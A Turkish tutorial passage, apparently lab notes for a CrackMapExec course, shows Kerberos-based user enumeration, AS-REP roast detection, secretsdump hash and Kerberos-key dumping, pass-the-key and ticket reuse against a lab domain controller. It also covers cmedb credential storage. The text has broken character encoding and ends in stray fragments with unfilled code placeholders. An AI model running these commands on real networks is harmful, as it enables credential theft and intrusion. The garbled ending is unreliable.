CrackMapExec'i `-k` veya `--kerberos` seÃ§eneÄŸi olmadan bir kullanÄ±cÄ± adÄ± ve parola veya kullanÄ±cÄ± adÄ± ve hash ile kullandÄ±ÄŸÄ±mÄ±zda, NTLM kimlik doÄŸrulamasÄ± gerÃ§ekleÅŸtiririz. Kerberos seÃ§eneÄŸini kullanÄ±rsak bunun yerine Kerberos kimlik doÄŸrulamasÄ±nÄ± kullanabiliriz.

### Kerberos Authentication

```
crackmapexec smb 10.129.203.121 -u robert -p Inlanefreight01! --kerberos -
-shares

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [+] Enumerated shares
SMB 10.129.203.121 445 DC01 Share
Permissions Remark
SMB 10.129.203.121 445 DC01 ----- ------
----- ------
SMB 10.129.203.121 445 DC01 ADMIN$ READ
Remote Admin
SMB 10.129.203.121 445 DC01 C$
READ,WRITE Default share
SMB 10.129.203.121 445 DC01 carlos
SMB 10.129.203.121 445 DC01 D$
READ,WRITE Default share
SMB 10.129.203.121 445 DC01 david
SMB 10.129.203.121 445 DC01 IPC$ READ
Remote IPC
SMB 10.129.203.121 445 DC01 IT
READ,WRITE
SMB 10.129.203.121 445 DC01 john
SMB 10.129.203.121 445 DC01 julio
SMB 10.129.203.121 445 DC01 linux01
READ,WRITE
SMB 10.129.203.121 445 DC01 NETLOGON READ
Logon server share
SMB 10.129.203.121 445 DC01 svc_workstations
SMB 10.129.203.121 445 DC01 SYSVOL READ
Logon server share

```




### Kerberos Kimlik DoÄŸrulamasÄ± ile KullanÄ±cÄ±larÄ± TanÄ±mlama

Yeni Kerberos kimlik doÄŸrulama uygulamasÄ± ile CrackMapExec, CME iÃ§inde kendi `Kerbrute`'unu oluÅŸturmak iÃ§in tÃ¼m bileÅŸenlere sahiptir. Bu, CME'nin bir kullanÄ±cÄ±nÄ±n domain Ã¼zerinde var olup olmadÄ±ÄŸÄ±nÄ± ve bu kullanÄ±cÄ±nÄ±n Kerberos `pre-authentication` (`ASREPRoasting`) gerektirmeyecek ÅŸekilde yapÄ±landÄ±rÄ±lÄ±p yapÄ±landÄ±rÄ±lmadÄ±ÄŸÄ±nÄ± anlayabileceÄŸi anlamÄ±na gelir. Bunu aÅŸaÄŸÄ±daki hesaplarla Ã§alÄ±ÅŸÄ±rken gÃ¶relim: `account_not_exist` , `julio` , ve `robert` .


### Kerberos Kimlik DoÄŸrulamasÄ± ile KullanÄ±cÄ±larÄ± TanÄ±mlama

```
crackmapexec smb 10.129.203.121 -u account_not_exist julio robert -p
OtherPassword --kerberos

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\account_not_exist: KDC_ERR_C_PRINCIPAL_UNKNOWN
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\julio: KDC_ERR_PREAUTH_FAILED
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\robert account vulnerable to asreproast attack
```

GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, `Kerbrute` CrackMapExec TGT isteklerini Ã¶n kimlik doÄŸrulamasÄ± olmadan gÃ¶nderdiÄŸinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasÄ±yla yanÄ±t verirse, kullanÄ±cÄ± adÄ± mevcut deÄŸildir. Ancak, KDC pre-authentication isterse, `KDC_ERR_PREAUTH_FAILED` hatasÄ±yla yanÄ±t verir, bu da kullanÄ±cÄ± adÄ±nÄ±n mevcut olduÄŸu anlamÄ±na gelir. Son olarak, `asreproast` saldÄ±rÄ±sÄ±na karÅŸÄ± savunmasÄ±z bir hata hesabÄ± gÃ¶rÃ¼rsek, daha Ã¶nce `AESREPRoast` HesaplarÄ±nÄ± Bulma bÃ¶lÃ¼mÃ¼nde gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi AESREPoast saldÄ±rÄ±larÄ±na karÅŸÄ± hassastÄ±r.

Bu, oturum aÃ§ma hatalarÄ±na neden olmaz, bu nedenle herhangi bir hesabÄ± kilitlemez, ancak Kerberos logu etkinleÅŸtirilmiÅŸse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralÄ± bir Windows olay kimliÄŸi oluÅŸturur.


### AES-128 veya AES-256 kullanma

AyrÄ±ca, Kerberos Kimlik DoÄŸrulamasÄ± iÃ§in AES-128 veya AES-256 hash'leri de kullanabiliriz. `Impacket`'ten `Secretsdump` gibi araÃ§lar, genellikle bu tÃ¼r hash'leri alabilir. AES-128 veya AES-256 kullandÄ±ÄŸÄ±mÄ±zda, trafiÄŸimiz normal Kerberos trafiÄŸine daha Ã§ok benzeyecek ve bu da operasyonel bir avantaj (opsec) saÄŸlayacaktÄ±r. Hadi Secretsdump'u kullanalÄ±m ve ardÄ±ndan AES256 ile kimlik doÄŸrulamasÄ± yapalÄ±m.


### AES256 ile Kimlik DoÄŸrulama

```
secretsdump.py

INLANEFREIGHT.HTB/julio:[email protected]
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth
Corporation
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xbfb21eeffaaa8abaf5365adf6562a1a4
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353b
e1c2c3c99:::
<SNIP>
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-
96:f535588e917cf644294519f345f5e14c852d6ae4d9c6fbfefc54be82b84bb35c
Administrator:aes128-cts-hmac-sha1-96:6a1b10171f2f12d7d6fbb31e1823617b
Administrator:des-cbc-md5:b38a08d637d9e06e
krbtgt:aes256-cts-hmac-sha1-
96:b67cba3eccadb27d482929f88ace038f9a5b73b6bbc3af93f40575cd6b5fb02c
krbtgt:aes128-cts-hmac-sha1-96:d6a6464fdf51d2bd587366254dcd34e7
krbtgt:des-cbc-md5:73f701bcf4d5d96e
inlanefreight.htb\julio:aes256-cts-hmac-sha1-
96:77da7057b42509a1d086f4f58e7252ad673b1940be2f741c496c577d10e4df76
inlanefreight.htb\julio:aes128-cts-hmac-sha1-
96:ae1b6f722a8857a60c781dd1c12dae4d
<SNIP>

```

```
crackmapexec smb 10.129.203.121 -u julio --aesKey
77da7057b42509a1d086f4f58e7252ad673b1940be2f741c496c577d10e4df76

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\julio:77da7057b42509a1d086f4f58e7252ad673b1940be2f741c49
6c577d10e4df76 (Pwn3d!)

```


### CCache file - Kerberos Authentication

Bir credential cache (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanÄ±cÄ±nÄ±n oturumu sÃ¼rdÃ¼ÄŸÃ¼ sÃ¼rece geÃ§erli kalÄ±rlar, bu nedenle servislere birden fazla kez kimlik doÄŸrulamasÄ± yapmak (Ã¶rneÄŸin, bir web veya posta sunucusuna birden fazla kez baÄŸlanmak) her seferinde KDC ile iletiÅŸim kurmayÄ± gerektirmez.

Ã‡oÄŸu durumda, Linux makineleri Kerberos tickerlarÄ± ccache dosyalarÄ± olarak depolar, sistemlerin ticketlarÄ± kullanma ÅŸekli, `ccache` dosyasÄ±nÄ±n yolunu gÃ¶steren `KRB5CCNAME` environment variable aracÄ±lÄ±ÄŸÄ±yla olur. robert kullanÄ±cÄ±sÄ± iÃ§in bir ticket (ccache dosyasÄ±) oluÅŸturalÄ±m ve DC01'e kimlik doÄŸrulamasÄ± yapalÄ±m

Ticket'Ä± oluÅŸturmak iÃ§in [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracÄ±nÄ± kullanacaÄŸÄ±z ve KRB5CCNAME environment variable'i getTGT.py tarafÄ±ndan oluÅŸturulan ccache dosyasÄ±nÄ±n yoluna ayarlayacaÄŸÄ±z.


### Ticket Granting Tickets

```
getTGT.py inlanefreight.htb/robert:'Inlanefreight01!' -dc-ip
10.129.203.121

Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth
Corporation
[*] Saving ticket in robert.ccache
```

```
export KRB5CCNAME=$(pwd)/robert.ccache
```

Kerberos kimlik doÄŸrulama yÃ¶ntemimiz olarak `KRB5CCNAME` environment variable'ini kullanmak iÃ§in `--use-kcache` seÃ§eneÄŸini kullanmamÄ±z gerekir. KullanÄ±cÄ± adÄ± ve parola seÃ§enekleri gerekli deÄŸildir.


### ccache DosyasÄ±nÄ± Kerberos Kimlik DoÄŸrulama YÃ¶ntemi Olarak Kullanma (SMB ProtokolÃ¼)

```
crackmapexec smb 10.129.203.121 --use-kcache

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\robert from ccache
```


### Kerberos Kimlik DoÄŸrulama YÃ¶ntemi Olarak ccache DosyasÄ±nÄ±n KullanÄ±lmasÄ± (LDAP ProtokolÃ¼)

```
crackmapexec ldap 10.129.203.121 --use-kcache

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP 10.129.203.121 389 DC01 [+]
inlanefreight.htb\robert from ccache

```

Kerberos Kimlik DoÄŸrulamasÄ±nÄ± `MSSQL` protokolÃ¼ ile kullanmak iÃ§in hedef olarak IP adresi yerine bilgisayar adÄ±nÄ± veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolÃ¼nÃ¼n perde arkasÄ±nda IP'yi FQDN'ye dÃ¶nÃ¼ÅŸtÃ¼rmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasÄ±dÄ±r.


### MSSQL ProtokolÃ¼ ile ccache DosyasÄ±nÄ± Kullanma

```
crackmapexec mssql dc01 --use-kcache

MSSQL dc01.inlanefreight.htb 1433 DC01 [*] Windows
10.0 Build 17763 (name:DC01) (domain:inlanefreight.htb)
MSSQL dc01.inlanefreight.htb 1433 DC01 [+]
inlanefreight.htb\robert from ccache (Pwn3d!)
```

KullanÄ±cÄ± adlarÄ± ve parolalarla yaptÄ±ÄŸÄ±mÄ±z gibi Kerberos kimlik doÄŸrulamasÄ± ile herhangi bir modÃ¼lÃ¼ veya seÃ§eneÄŸi Ã§alÄ±ÅŸtÄ±rabiliriz


### Kerberos Kimlik DoÄŸrulamasÄ± ile PaylaÅŸÄ±mlarÄ± Listeleme


```
crackmapexec smb 10.129.203.121 --use-kcache --shares

SMB         10.129.203.121 445    DC01         [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)

SMB         10.129.203.121 445    DC01         [+]
inlanefreight.htb\robert from cache

SMB         10.129.203.121 445    DC01         [+] Enumerated shares
SMB         10.129.203.121 445    DC01         Share
SMB         10.129.203.121 445    DC01         Permissions
SMB         10.129.203.121 445    DC01         Remark
SMB         10.129.203.121 445    DC01         ----    ----

SMB         10.129.203.121 445    DC01         ADMIN$           ADMIN$   READ
Remote Admin
SMB         10.129.203.121 445    DC01         C$               READ

SMB         10.129.203.121 445    DC01         Default share    carlos
SMB         10.129.203.121 445    DC01         Default share    D$
SMB         10.129.203.121 445    DC01         Default share    david
SMB         10.129.203.121 445    DC01         IPC$             IPC$     READ
Remote IPC
SMB         10.129.203.121 445    DC01         IT               READ,WRITE
SMB         10.129.203.121 445    DC01         john
SMB         10.129.203.121 445    DC01         julio
SMB         10.129.203.121 445    DC01         linux01          READ,WRITE
SMB         10.129.203.121 445    DC01         NETLOGON         READ
Logon server share
SMB         10.129.203.121 445    DC01         SVC_WORKSTATIONS READ
SMB         10.129.203.121 445    DC01         SYSVOL           READ
Logon server share

```


CrackMapExec ile Kerberos Authentication'Ä±n nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± Ã¶ÄŸrendik. AÅŸaÄŸÄ±daki bÃ¶lÃ¼mde, CrackMapExec veritabanÄ± `cmedb` ile etkileÅŸime gireceÄŸiz

---


### CMEDB'de UzmanlaÅŸmak

CME otomatik olarak tÃ¼m kullanÄ±lan/dump edilen kimlik bilgilerini (diÄŸer bilgilerle birlikte) ilk Ã§alÄ±ÅŸtÄ±rmada kurulan `SQLite` veritabanÄ±nda saklar. TÃ¼m Ã§alÄ±ÅŸma alanlarÄ± ve ilgili veritabanlarÄ± `~/.cme/workspaces` iÃ§inde saklanÄ±r. VarsayÄ±lan veritabanlarÄ± `~/.cme/workspaces/default` dizininde bulunur. Bu dizinde her protokol iÃ§in bir SQLite dosyasÄ± bulunur.


### VarsayÄ±lan VeritabanlarÄ±nÄ± Listeleme

```
ls ~/.cme/workspaces/default/

ftp.db ldap.db mssql.db rdp.db smb.db ssh.db winrm.db
```

### VeritabanÄ± ile EtkileÅŸim

CME, back-end veritabanÄ± ile etkileÅŸimi kolaylaÅŸtÄ±ran ikinci bir komut satÄ±rÄ± script'i olan `cmedb` ile birlikte gelir. cmedb komutunu yazmak bizi bir komut shell'i gÃ¶tÃ¼recektir:

### CMEDB

```
cmedb
cmedb (default) >
```


### Workspaces

VarsayÄ±lan workspace adÄ± `default` olarak adlandÄ±rÄ±lÄ±r (bilgi `prompt` gÃ¶sterildiÄŸi gibi). Bir workspace seÃ§ildiÄŸinde, CME'de yaptÄ±ÄŸÄ±mÄ±z her ÅŸey bu workspace'de saklanacaktÄ±r. Bir workspace oluÅŸturmak iÃ§in, `cmedb (default) >` komut promt root'una gitmemiz gerekir. EÄŸer protokol veritabanÄ±ndaysak, geri komutunu kullanmamÄ±z gerekir.


### Creating a Workspace

```
cmedb
cmedb (default)(smb) > back
cmedb (default) > workspace create inlanefreight
[*] Creating workspace 'inlanefreight'
[*] Initializing FTP protocol database
[*] Initializing SSH protocol database
[*] Initializing RDP protocol database
[*] Initializing LDAP protocol database
[*] Initializing MSSQL protocol database
[*] Initializing SMB protocol database
[*] Initializing WINRM protocol database
cmedb (inlanefreight) >
```

Workspace'leri listelemek iÃ§in `workspace list` , workspace'i deÄŸiÅŸtirmek iÃ§in ise `workspace <workspace>` yazabiliriz.


### Workspace'leri Listeleme ve DeÄŸiÅŸtirme

```
cmedb (inlanefreight) > workspace list
[*] Enumerating Workspaces
default
==> inlanefreight
cmedb (inlanefreight) > workspace default
cmedb (default) >
```


### Bir ProtokolÃ¼n VeritabanÄ±na EriÅŸim

cmedb her protokol iÃ§in bir veritabanÄ±na sahiptir, ancak bu modÃ¼lÃ¼n yazÄ±ldÄ±ÄŸÄ± sÄ±rada yalnÄ±zca `SMB` ve `MSSQL` yararlÄ± seÃ§eneklere sahiptir:

| Protokol | SeÃ§enekler                                         |
| -------- | -------------------------------------------------- |
| SMB      | back exit export import groups hosts import shares |
| MSSQL    | back exit export import host import                |
| LDAP     | back exit export import                            |
| WinRM    | back exit export import                            |
| RDP      | back exit export import                            |
| FTP      | back exit export import                            |
| SSH      | back exit export import                            |

Bir protokolÃ¼n veritabanÄ±na eriÅŸmek iÃ§in `proto` `<protocol>` komutunu Ã§alÄ±ÅŸtÄ±rÄ±n. Protokol iÃ§inde, mevcut seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in `help` seÃ§eneÄŸini kullanabiliriz:

### SMB Protokol VeritabanÄ±na BaÄŸlanma

```
cmedb (default) > proto smb
cmedb (default)(smb) > help
Documented commands (type help <topic>):
========================================
help
Undocumented commands:
======================
back creds exit export groups hosts import shares
```


### Protocol Options

SMB veya MSSQL protokolÃ¼nÃ¼ her kullandÄ±ÄŸÄ±mÄ±zda, kimlik bilgileri, saldÄ±rdÄ±ÄŸÄ±mÄ±z hostlar, eriÅŸtiÄŸimiz paylaÅŸÄ±mlar ve listelediÄŸimiz gruplar CrackMapExec veritabanÄ±nda saklanÄ±r. VeritabanÄ±nda sahip olduÄŸumuz verilere eriÅŸelim.

### Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

CrackMapExec veritabanÄ±, CrackMapExec kullanarak kullandÄ±ÄŸÄ±mÄ±z veya elde ettiÄŸimiz tÃ¼m kimlik bilgilerini depolar. Bu veritabanÄ±, kimlik bilgilerinin tÃ¼rÃ¼nÃ¼, `dÃ¼z metin` veya `hash` olup olmadÄ±ÄŸÄ±nÄ±, domain, kullanÄ±cÄ± adÄ± ve ÅŸifreyi saklar. SMB protokolÃ¼nÃ¼n kimlik bilgilerini gÃ¶rmek iÃ§in protokol iÃ§indeki `creds` seÃ§eneÄŸini kullanmamÄ±z gerekir.


### Displaying SMB Credentials

```
cmedb (default) (smb) > creds

+Credentials--------------------------------------------------------------------------------------------------+
| CredID | Admin On | CredType | Domain      | UserName    | Password                                                    |
+-------------------------------------------------------------------------------------------------------------+
| 1      | 0 Host(s) | plaintext | INLANEFREIGHT | peter       | Password123                                                 |
| 2      | 2 Host(s) | plaintext | INLANEFREIGHT | robert      | Inlanefreight01!                                            |
| 3      | 0 Host(s) | plaintext | INLANEFREIGHT | grace       | Inlanefreight01!                                            |
| 4      | 4 Host(s) | plaintext | INLANEFREIGHT | julio       | Password1                                                   |
+-------------------------------------------------------------------------------------------------------------+
<SNIP>

<SNIP>

| 40     | 0 Host(s) | hash     | INLANEFREIGHT | kiosko      | aad3b435b51404eeaad3b435b51404ee:f399c1b9e7f851b949767163c35ae296 |
| 41     | 0 Host(s) | hash     | INLANEFREIGHT | testaccount | aad3b435b51404eeaad3b435b51404ee:e02ca966c5c0b22eba3c8c4c5ae568b1 |
+-------------------------------------------------------------------------------------------------------------+
cmedb (default) (smb) > creds julio

+Credentials--------------------------------------------------------------------------------------------------+
| CredID | Admin On | CredType | Domain      | UserName    | Password                                                    |
+-------------------------------------------------------------------------------------------------------------+
| 4      | 4 Host(s) | plaintext | INLANEFREIGHT | julio       | Password1                                                   |
+-------------------------------------------------------------------------------------------------------------+

| 26     | 0 Host(s) | hash     | INLANEFREIGHT | julio       | 64f12cdda88057e06a81b54e73b949b |
+-------------------------------------------------------------------------------------------------------------+
```


GÃ¶rdÃ¼ÄŸÃ¼nÃ¼z gibi, creds'ten sonra bir `kullanÄ±cÄ± adÄ±` ekleyerek belirli kullanÄ±cÄ±larÄ± da sorgulayabiliriz. AyrÄ±ca `creds hash` seÃ§eneÄŸi ile tÃ¼m hash'leri veya `creds plaintext` seÃ§eneÄŸi ile tÃ¼m plaintext kimlik bilgilerini listeleyebiliriz.


### Hash'leri ve DÃ¼z Metin Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

```
cmedb (default)(smb) > creds hash

+Credentials---------+----------+---------------+--------------------+---------------------------------------------------------------+
| CredID | Admin On | CredType | Domain      | UserName    | Password                                                    |
+--------+-----------+----------+---------------+--------------------+---------------------------------------------------------------+
<SNIP>
| 24     | 0 Host(s) | hash     | DC01         | Guest       | aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 |
| 25     | 0 Host(s) | hash     | DC01         | DefaultAccount | aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 |
| 26     | 0 Host(s) | hash     | INLANEFREIGHT | julio       | 64f12cddaa88057e06a81b54e73b949b |
<SNIP>
+--------+-----------+----------+---------------+--------------------+---------------------------------------------------------------+

cmedb (default)(smb) > creds plaintext

+Credentials---------+-----------+-----------------+--------------------+----------------------------------+
| CredID | Admin On | CredType | Domain      | UserName    | Password                       |
+--------+-----------+-----------+-----------------+--------------------+----------------------------------+
| 1      | 0 Host(s) | plaintext | INLANEFREIGHT | peter       | Password123                    |
| 2      | 2 Host(s) | plaintext | INLANEFREIGHT | robert      | Inlanefreight01!               |
| 3      | 0 Host(s) | plaintext | INLANEFREIGHT | grace       | Inlanefreight01!               |
<SNIP>
+--------+-----------+-----------+-----------------+--------------------+----------------------------------+
```


Not: cmedb, mevcut seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in sekme otomatik tamamlamaya izin verir

MSSQL kimlik bilgileri MSSQL protokolÃ¼ne kaydedilir ve SMB kimlik bilgilerini gÃ¶rÃ¼ntÃ¼lediÄŸimiz gibi gÃ¶rÃ¼ntÃ¼lenebilir


### MSSQL iÃ§in Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

```
cmedb
cmedb (default)(smb) > back
cmedb (default) > proto mssql
cmedb (default)(mssql) > creds

+Credentials---------+-----------+---------------+---------------+------------------------------------------+
| CredID | Admin On | CredType | Domain      | UserName    | Password                               |
+--------+-----------+-----------+---------------+---------------+------------------------------------------+
| 1      | 0 Host(s) | plaintext | DC01         | nicole       | Database2                              |
<SNIP>
| 6      | 0 Host(s) | hash      | INLANEFREIGHT | julio        | 64F12CDDAA88057E06A81B54E73B949B      |
| 7      | 0 Host(s) | plaintext | INLANEFREIGHT | julio        | Password1                               |
+--------+-----------+-----------+---------------+---------------+------------------------------------------+
```

Not: Domain alanÄ±nÄ± bir bilgisayar ile gÃ¶rÃ¼yorsak, bu bir MSSQL hesabÄ± kullandÄ±ÄŸÄ±mÄ±z anlamÄ±na gelir.

### Kimlik Bilgilerini Kullanma

CrackMapExec'i Ã§alÄ±ÅŸtÄ±rmak iÃ§in veritabanÄ±ndaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediÄŸimiz kimlik bilgilerini tanÄ±mlamamÄ±z ve hangi id'nin hesapla iliÅŸkili olduÄŸunu belirlememiz gerekir. `Julio`'nun kimlik bilgilerini `id 4` ile kullanalÄ±m. KullanÄ±cÄ± adÄ± ve parola yerine bir kimlik bilgisi kullanmak iÃ§in `-id CredID` seÃ§eneÄŸini kullanmamÄ±z gerekir.

### CrackMapExec ile EtkileÅŸim iÃ§in CredID KullanÄ±mÄ±

```
crackmapexec smb 10.129.203.121 -id 4 -x whoami

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
INLANEFREIGHT\julio:Password1 (Pwn3d!)
SMB 10.129.203.121 445 DC01 [+] Executed command
SMB 10.129.203.121 445 DC01 inlanefreight\julio
```


### Hosts Information

MSSQL ve SMB iÃ§in, eriÅŸim saÄŸladÄ±ÄŸÄ±mÄ±z bilgisayarlarÄ±, IP'lerini, domainlerini ve iÅŸletim sistemlerini de belirleyebiliriz.


### Displaying Hosts

```
cmedb
cmedb (default)(smb) > hosts

+Hosts---+-----------+--------------------------------+-----------------+--------------------------------+--------------------------+-------+---------+
| HostID | Admins    | IP                             | Hostname        | Domain         | OS                       | SMBv1 | Signing |
+--------+-----------+--------------------------------+-----------------+--------------------------------+--------------------------+-------+---------+
| 1      | 1 Cred(s) | 10.129.203.121                 | DC01            | INLANEFREIGHT  | Windows 10.0 Build 17763 | 0     | 1       |
| 2      | 3 Cred(s) | 10.129.204.23                  | MS01            | INLANEFREIGHT  | Windows 10.0 Build 17763 | 0     | 0       |
<SNIP>
| 9      | 1 Cred(s) | dead:beef::8c8a:5209:5876:537d | MS01            | INLANEFREIGHT  | Windows 10.0 Build 17763 | 0     | 0       |
| 11     | 0 Cred(s) | dc01.inlanefreight.htb         | DC01            | INLANEFREIGHT  | Windows 10.0 Build 17763 | 0     | 1       |
+--------+-----------+--------------------------------+-----------------+--------------------------------+--------------------------+-------+---------+

cmedb (default)(smb) > hosts ms01

+Hosts---+-----------+--------------------------------+----------+--------------------------------+--------------------------+-------+---------+
| HostID | Admins    | IP                             | Hostname | Domain         | OS                       | SMBv1 | Signing |
+--------+-----------+--------------------------------+----------+--------------------------------+--------------------------+-------+---------+
| 2      | 3 Cred(s) | 10.129.204.23                  | MS01     | INLANEFREIGHT  | Windows 10.0 Build 17763 | 0     | 0       |
| 9      | 1 Cred(s) | dead:beef::8c8a:5209:5876:537d | MS01     | INLANEFREIGHT  | Windows 10.0 Build 17763 | 0     | 0       |
+--------+-----------+--------------------------------+----------+--------------------------------+--------------------------+-------+---------+
```


### Share Information

CME veritabanÄ± da belirlediÄŸimiz paylaÅŸÄ±mlÄ± klasÃ¶rleri saklÄ±yor ve okuma ve yazma eriÅŸimine sahip kullanÄ±cÄ±larÄ±mÄ±z olup olmadÄ±ÄŸÄ±nÄ± bize sÃ¶ylÃ¼yor. PaylaÅŸÄ±m bilgilerine eriÅŸmek iÃ§in `cmedb` iÃ§erisinde SMB protokolÃ¼ iÃ§erisinde `shares` seÃ§eneÄŸini kullanmamÄ±z gerekiyor.

### PaylaÅŸÄ±mlarÄ± Geri Alma

```
cmedb
cmedb (default)(smb) > shares

+---------+----------+------------------+---------------------------------------------+-------------+--------------+
| ShareID | computer | Name             | Remark                                     | Read Access | Write Access |
+---------+----------+------------------+---------------------------------------------+-------------+--------------+
| 1       | DC01     | ADMIN$           | Remote Admin                               | 0 User(s)   | 0 Users      |
| 2       | DC01     | C$               | Default share                              | 0 User(s)   | 0 Users      |
| 3       | DC01     | carlos           |                                            | 0 User(s)   | 0 Users      |
<SNIP>
| 33      | MS01     | ADMIN$           | Remote Admin                               | 1 User(s)   | 1 Users      |
| 34      | MS01     | C$               | Default share                              | 1 User(s)   | 1 Users      |
| 35      | MS01     | CertEnroll       | Active Directory Certificate Services share | 1 User(s)   | 1 Users      |
+---------+----------+------------------+---------------------------------------------+-------------+--------------+
```


### KullanÄ±cÄ± Ekleme ve KaldÄ±rma

CME, kullanÄ±cÄ±larÄ± veritabanÄ±ndan manuel olarak ekleme veya kaldÄ±rma Ã¶zelliÄŸini destekler. ProtokolÃ¼ (SMB veya MSSQL) seÃ§iyoruz ve `creds add` veya `creds remove` kullanÄ±yoruz.


### cmedb'ye KullanÄ±cÄ± Ekleme

```
cmedb
cmedb (default)(smb) > creds add
[!] Format is 'add domain username password
cmedb (default)(smb) > creds add INLANEFREIGHT john Password3
```

Åimdi eklediÄŸimiz kullanÄ±cÄ±yÄ± kaldÄ±rmayÄ± deneyebiliriz.

### Bir KullanÄ±cÄ±yÄ± cmedb'den KaldÄ±rma

```
cmedb
cmedb (default)(smb) > creds remove
[!] Format is 'remove <credID>'
cmedb (default)(smb) > creds 45
```


### Empire Kimlik Bilgilerini Ä°mport Etme

cmedb'nin sahip olduÄŸu bir baÅŸka Ã¶zellik de `Empire`'dan kimlik bilgilerini import etme yeteneÄŸidir.


### Import from Empire

```
cmedb
cmedb (default)(smb) > import empire
[-] Unable to connect to Empire's RESTful API server:
HTTPSConnectionPool(host='127.0.0.1', port=1337): Max retries exceeded
with url: /api/admin/login (Caused by
NewConnectionError('<urllib3.connection.HTTPSConnection object at
0x7f5d248fabe0>: Failed to establish a new connection: [Errno 111]
Connection refused'))
```

Not: Bu Ã¶zelliÄŸi kullanmak istiyorsanÄ±z `Empire`'Ä± yapÄ±landÄ±rdÄ±ÄŸÄ±nÄ±zdan emin olun

### Export cmedb Data

CrackMapExec veritabanÄ±ndan kimlik bilgilerini, hostlarÄ±, local adminleri ve paylaÅŸÄ±mlarÄ± export edebiliriz.

### Kimlik Bilgilerini cmedb'den Export Etme

```
cmedb
cmedb (default)(smb) > export invalid
[-] invalid argument, specify creds, hosts, local_admins, or shares
cmedb (default)(smb) > export creds
[-] invalid arguments, export creds <simple/detailed> <filename>
cmedb (default)(smb) > export creds detailed detailed_creds.csv
[+] creds exported
cmedb (default)(smb) > export shares detailed detailed_shares.csv
[+] creds exported
cmedb (default)(smb) > export local_admins detailed
detailed_local_admins.csv
[+] Local Admins exported
cmedb (default)(smb) > exit
```

```
cat detailed_local_admins.csv
"id";"userid";"computer"
"1";"INLANEFREIGHT/julio";"DC01"
"2";"INLANEFREIGHT/julio";"MS01"
<SNIP>
```

Veriler CSV dosyasÄ± olarak dÄ±ÅŸa aktarÄ±lÄ±r. `LibreOffice` veya `Excel` gibi araÃ§larÄ± kullanarak aÃ§abiliriz.

![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)


### Son

CrackMapExec, aÄŸ gÃ¼venliÄŸi testlerinde ve sÄ±zma testlerinde kullanÄ±cÄ±larÄ±n iÅŸini kolaylaÅŸtÄ±ran, etkili bir araÃ§tÄ±r. GeniÅŸ protokol desteÄŸi, hÄ±zlÄ± keÅŸif, gÃ¼venlik aÃ§Ä±klarÄ± tespiti ve yÃ¶netimsel haklar elde etme gibi Ã§eÅŸitli Ã¶zellikleriyle gÃ¼venlik profesyonellerinin vazgeÃ§ilmez araÃ§larÄ± arasÄ±nda yer alÄ±r. Bu araÃ§, aÄŸ yapÄ±larÄ±nÄ±n daha gÃ¼venli hale getirilmesi iÃ§in Ã¶nemli bir rol oynar ve her gÃ¼venlik uzmanÄ±nÄ±n repertuarÄ±nda bulunmasÄ± gereken bir araÃ§tÄ±r.


, 'print

Dizine gidebilir ve kullanÄ±cÄ±nÄ±n eriÅŸebileceÄŸi tÃ¼m dosyalarÄ±n bir listesini alabiliriz:


### KullanÄ±cÄ±nÄ±n KullanabileceÄŸi DosyalarÄ± Listeleme

{{CODE_BLOCK_94}}

EÄŸer paylaÅŸÄ±mÄ±n tÃ¼m iÃ§eriÄŸini indirmek istiyorsak `READ_ONLY=false` seÃ§eneÄŸini aÅŸaÄŸÄ±daki gibi kullanabiliriz:

{{CODE_BLOCK_95}}

